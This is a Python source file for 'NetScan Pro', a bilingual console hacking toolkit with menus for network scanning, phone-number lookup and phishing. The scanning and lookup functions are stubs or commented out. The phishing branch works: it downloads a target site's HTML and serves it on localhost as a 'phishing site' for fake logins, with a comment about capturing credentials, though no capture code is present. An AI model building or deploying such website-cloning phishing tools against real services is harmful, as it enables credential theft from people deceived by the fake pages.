import os
import subprocess
from colorama import init, Fore, Style
import time
import numlookupapi
import requests
from bs4 import BeautifulSoup
import threading
import http.server
import socketserver

# Função para limpar a tela do console
def clear_console():
    """Clears the console screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

# Função para exibir a mensagem de boas-vindas
def welcome_message(language):
    clear_console()
    if language == '1':
        print(Fore.GREEN + Style.BRIGHT + "Welcome to the NetScan Pro tool!".center(50))
    else:
        print(Fore.GREEN + Style.BRIGHT + "Bem-vindo à ferramenta NetScan Pro!".center(50))
    print()
    time.sleep(2)
    clear_console()

# Função para exibir a mensagem de despedida
def goodbye_message(language):
    clear_console()
    if language == '1':
        print(Fore.GREEN + Style.BRIGHT + "Thank you for using NetScan Pro tool!".center(50))
    else:
        print(Fore.GREEN + Style.BRIGHT + "Obrigado por usar a ferramenta NetScan Pro!".center(50))
    time.sleep(3)
    print()

# Função para lidar com opções inválidas
def handle_invalid_option(language):
    clear_console()
    if language == '1':
        print(Fore.RED + "Invalid option. Please choose again.")
    else:
        print(Fore.RED + "Opção inválida. Por favor, escolha novamente.")
    time.sleep(2)

# Função para exibir a mensagem de carregamento
def loading_screen():
    print("Loading...")
    time.sleep(3)
    clear_console()
    print(Style.BRIGHT + "@wbrunnno".center(100))
    time.sleep(1)

# Função para atualizar a ferramenta do GitHub
def update_tool_from_github(language):
    clear_console()
    print(Fore.YELLOW + Style.BRIGHT + "Updating NetScan Pro tool from GitHub...")

    try:
        # Atualização usando Git
        subprocess.run(["git", "pull", "https://github.com/WeverttonBruno/NetScanPro.git"])
        print("NetScan Pro tool has been updated successfully!")

        # Reiniciando a ferramenta após a atualização
        print("Restarting NetScan Pro tool...")
        time.sleep(2)
        clear_console()
        print("NetScan Pro tool has been updated and restarted.")

        time.sleep(2)
    except Exception as e:
        print(Fore.RED + f"Error updating the tool: {e}")

    # Retorna ao menu principal após a atualização
    time.sleep(3)
    main_menu(language)

# Função para exibir o menu principal
def main_menu(language):
    while True:
        clear_console()
        if language == '1':
            print(Fore.YELLOW + Style.BRIGHT + " Main Menu ".center(50, '-'))
            print("1. Network Tools")
            print("2. Social Engineering Tools")
            print("3. Update Tool")
            print("0. Exit")
        else:
            print(Fore.YELLOW + Style.BRIGHT + " Menu Principal ".center(50, '-'))
            print("1. Ferramentas de Rede")
            print("2. Ferramentas de Engenharia Social")
            print("3. Atualizar Ferramenta")
            print("0. Sair")

        choice = input("Choose an option: ")

        if choice == '0':
            goodbye_message(language)
            break
        elif choice == '1':
            network_tools_menu(language)
        elif choice == '2':
            social_engineering_tools(language)
        elif choice == '3':
            update_tool_from_github(language)
        else:
            handle_invalid_option(language)

# Função para o menu de ferramentas de rede
def network_tools_menu(language):
    while True:
        clear_console()
        if language == '1':
            print(Fore.YELLOW + Style.BRIGHT + " Network Tools ".center(50, '-'))
            print("1. Scan a Network")
            print("2. Scan Own Network")
            print("3. Vulnerability Scanning")
            print("0. Back to Main Menu")
        else:
            print(Fore.YELLOW + Style.BRIGHT + " Ferramentas de Rede ".center(50, '-'))
            print("1. Escanear uma Rede")
            print("2. Escanear a Própria Rede")
            print("3. Escaneamento de Vulnerabilidades")
            print("0. Voltar ao Menu Principal")

        choice = input("Choose an option: ")

        if choice == '0':
            return
        elif choice == '1':
            enter_network(language)
            manual_mode(language)
        elif choice == '2':
            scan_own_network(language)
        elif choice == '3':
            vulnerability_scan_mode(language)
        else:
            handle_invalid_option(language)

# Função para entrar com o nome da rede
def enter_network(language):
    clear_console()
    if language == '1':
        return input("Enter the network name: ")
    else:
        return input("Digite o nome da rede: ")

# Função para o modo manual
def manual_mode(language):
    clear_console()
    if language == '1':
        print("Scanning network in manual mode...")
    else:
        print("Escanenado rede no modo manual...")

    # Lógica para o modo manual (simulado)
    time.sleep(3)
    input("Press Enter to continue...")

# Função para escanear a própria rede
def scan_own_network(language):
    clear_console()
    if language == '1':
        print("Scanning own network...")
    else:
        print("Escanenando a própria rede...")

    # Lógica para escanear a própria rede (simulado)
    time.sleep(3)
    input("Press Enter to continue...")

# Função para o escaneamento de vulnerabilidades
def vulnerability_scan_mode(language):
    clear_console()
    if language == '1':
        print("Vulnerability scanning...")
    else:
        print("Escaneamento de vulnerabilidades...")

    # Lógica para o escaneamento de vulnerabilidades (simulado)
    time.sleep(3)
    input("Press Enter to continue...")

# Função para o menu de ferramentas de engenharia social
def social_engineering_tools(language):
    while True:
        clear_console()
        if language == '1':
            print(Fore.YELLOW + Style.BRIGHT + " Social Engineering Tools ".center(50, '-'))
            print("1. Phone Number Information")
            print("2. Phishing")
            print("0. Back to Main Menu")
        else:
            print(Fore.YELLOW + Style.BRIGHT + " Ferramentas de Engenharia Social ".center(50, '-'))
            print("1. Informações de Número de Telefone")
            print("2. Phishing")
            print("0. Voltar ao Menu Principal")

        choice = input("Choose an option: ")

        if choice == '0':
            return
        elif choice == '1':
            phone_number_info(language)
        elif choice == '2':
            phishing_menu(language)
        else:
            handle_invalid_option(language)

# Função para o submenu de phishing
def phishing_menu(language):
    while True:
        clear_console()
        if language == '1':
            print(Fore.YELLOW + Style.BRIGHT + " Phishing Menu ".center(50, '-'))
            print("1. Fake Login Pages")
            print("0. Back to Social Engineering Tools")
        else:
            print(Fore.YELLOW + Style.BRIGHT + " Menu de Phishing ".center(50, '-'))
            print("1. Páginas de Logins Falsas")
            print("0. Voltar para Ferramentas de Engenharia Social")

        choice = input("Choose an option: ")

        if choice == '0':
            return
        elif choice == '1':
            fake_login_pages(language)
        else:
            handle_invalid_option(language)

# Função para as páginas de logins falsas
def fake_login_pages(language):
    clear_console()
    if language == '1':
        print("Enter the URL of the website to clone for fake login:")
    else:
        print("Digite a URL do site para clonar para login falso:")

    url = input("URL: ")

    # Selecionar o servidor (apenas localhost)
    server_choice = '1'

    clone_website(url, server_choice, language)

# Função para clonar um site para login falso
def clone_website(url, server_choice, language):
    clear_console()
    if language == '1':
        print(f"Cloning {url} for fake login...")
    else:
        print(f"Clonando {url} para login falso...")

    try:
        # Fazendo requisição GET para obter o conteúdo da página
        response = requests.get(url)
        if response.status_code == 200:
            # Parseando o conteúdo com BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')

            # Salvando o HTML e CSS
            html_content = soup.prettify()
            css_content = ''  # Lógica para extrair o CSS da página

            # Salvar HTML e CSS em arquivos locais
            with open('index.html', 'w', encoding='utf-8') as html_file:
                html_file.write(html_content)

            with open('styles.css', 'w', encoding='utf-8') as css_file:
                css_file.write(css_content)

            print("HTML and CSS downloaded successfully!")

            # Continuar com a execução no servidor selecionado (apenas localhost implementado)
            if server_choice == '1':
                run_local_server(language)

        else:
            print(f"Failed to clone {url}. Status code: {response.status_code}")

    except Exception as e:
        print(f"Error cloning website: {e}")

# Função para executar o servidor local
def run_local_server(language):
    clear_console()
    if language == '1':
        print("Running phishing site on localhost...")
    else:
        print("Executando site de phishing em localhost...")

    # Configurar o servidor HTTP local para servir os arquivos clonados
    class PhishingServer(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory='./')  # Diretório onde os arquivos estão salvos

    try:
        # Iniciar o servidor em uma thread separada
        server = socketserver.TCPServer(('localhost', 8080), PhishingServer)
        server_thread = threading.Thread(target=server.serve_forever)
        server_thread.daemon = True
        server_thread.start()

        print("Server running at http://localhost:8080")
        input("\nPress Enter to stop the phishing server and continue...")

        # Após capturar as credenciais, parar o servidor
        server.shutdown()
        server.server_close()

        # Limpar os arquivos HTML e CSS
        clean_up_files()

    except Exception as e:
        print(f"Error running local server: {e}")

# Função para limpar os arquivos HTML e CSS
def clean_up_files():
    try:
        os.remove('index.html')
        os.remove('styles.css')
        print("Files cleaned up successfully!")
    except Exception as e:
        print(f"Error cleaning up files: {e}")

# Função para informações de número de telefone
def phone_number_info(language):
    clear_console()
    if language == '1':
        print("Phone Number Information")
        print("------------------------")
        number = input("Enter the phone number: ")
        # Lógica para obter informações do número de telefone usando a API
        # Exemplo:
        # response = numlookupapi.lookup(number)
        # print(response)
    else:
        print("Informações de Número de Telefone")
        print("---------------------------------")
        number = input("Digite o número de telefone: ")
        # Lógica para obter informações do número de telefone usando a API
        # Exemplo:
        # response = numlookupapi.lookup(number)
        # print(response)

    input("\nPress Enter to continue...")

# Função principal para iniciar o programa
def main():
    init(autoreset=True)  # Inicialização do Colorama para resetar as cores do terminal
    language = input("Choose language / Escolha o idioma:\n1. English\n2. Português\nChoice / Escolha: ")
    welcome_message(language)
    loading_screen()
    main_menu(language)

if __name__ == "__main__":
    main()
